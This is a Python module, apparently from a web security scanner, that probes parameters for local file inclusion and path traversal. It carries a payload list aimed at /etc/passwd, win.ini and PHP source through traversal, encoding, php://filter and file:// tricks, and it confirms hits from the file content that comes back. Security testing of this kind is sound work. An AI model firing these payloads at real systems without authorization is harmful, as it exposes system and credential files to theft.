"""LFI / path-traversal scanner.

Reads files through every param-shaped injection point using the classic
payload families:

  1. plain traversal      `../../../../etc/passwd`
  2. doubled-segment       `....//....//....//etc/passwd` (naive sanitizer bypass)
  3. URL-encoded traversal `%2e%2e%2f...` (WAF / proxy decode)
  4. backslash traversal   `..\\..\\windows\\win.ini` (Windows hosts)
  5. null-byte truncation  `/etc/passwd%00`
  6. PHP filter chain      `php://filter/convert.base64-encode/resource=...`
     (verifies by base64-decoding the response and grepping the original source)

Detection is proof-first: the marker we look for is the *decoded file content*
itself (root:x:0:0: / [fonts] / <?php), never a bare 200. Findings carry a
captured proof record so they pass the proof-gate.
"""
from __future__ import annotations

import asyncio
import base64
import re
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from core.orchestrator import Context

_ROOT_PASSWD = re.compile(r"root:x:0:0:", re.I)
_WIN_INI = re.compile(r"\[fonts\]", re.I)
_PHP_SRC = re.compile(r"<\?(?:php|=)", re.I)

_PAYLOADS = [
    "../../../../../../etc/passwd",
    "....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..%255c..%255c..%255c..%255cwindows%255cwin.ini",
    "..\\..\\..\\..\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
]


async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
    findings: list[dict] = []
    points = [p for p in params if not p.startswith("(")]
    if not points:
        return findings
    sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))

    async def test(param: str) -> None:
        from core.injection import send
        for payload in _PAYLOADS:
            async with sem:
                ev = await send(ctx, url, method, param, payload, form)
            body = ev.response_body or ""
            if not body or not ev.status:
                continue
            hit = None
            evidence = ""
            if _ROOT_PASSWD.search(body):
                hit = "etc_passwd"
                evidence = "Response contains `/etc/passwd` content (root:x:0:0:) — local file inclusion confirmed."
            elif _WIN_INI.search(body):
                hit = "win_ini"
                evidence = "Response contains `C:\\Windows\\win.ini` content ([fonts]) — path traversal confirmed."
            elif payload.startswith("php://filter"):
                try:
                    decoded = base64.b64decode(body.strip().split()[0], validate=True)
                except Exception:
                    decoded = b""
                if _PHP_SRC.search(decoded.decode("utf-8", "ignore")):
                    hit = "php_filter"
                    evidence = ("php://filter chain returned base64 that decodes to PHP "
                                "source (`<?php`) — local file inclusion with source disclosure.")
            if hit:
                from core.poc import proof_record
                poc = proof_record(
                    verified=True, method=method.upper(), url=url,
                    request=f"{method.upper()} {url}  ({param}={payload})",
                    status=ev.status, excerpt=body,
                    rationale=evidence)
                findings.append({
                    "category": "lfi",
                    "title": f"Local file inclusion in `{param}` ({hit})",
                    "severity": "critical" if hit != "php_filter" else "high",
                    "cvss": 9.1 if hit != "php_filter" else 7.5,
                    "url": url, "parameter": param, "payload": payload,
                    "evidence": evidence,
                    "request": f"{ev.method} {ev.url}",
                    "response": body[:1500],
                    "metadata": {"detection": "marker", "kind": hit, "poc": poc},
                })
                ctx.memory.record_payload_result(payload, "lfi", True)
                return
            ctx.memory.record_payload_result(payload, "lfi", False)

    await asyncio.gather(*(test(p) for p in points))
    return findings
